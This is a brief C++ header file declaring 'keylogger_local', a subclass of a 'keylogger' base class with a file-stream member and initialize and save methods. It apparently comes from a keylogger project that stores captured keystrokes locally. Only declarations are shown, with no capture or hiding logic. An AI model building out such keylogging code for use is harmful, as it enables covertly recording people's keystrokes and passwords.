#ifndef _KEYLOGGER_LOCAL_HPP_
#define _KEYLOGGER_LOCAL_HPP_

#include "../keylogger.hpp"

class keylogger_local : virtual public keylogger
{
    private:
		ofstream* a_ofstream;

    public:
		keylogger_local();

		virtual ~keylogger_local();

		virtual void initialize(string);

		virtual void save();
};

#endif
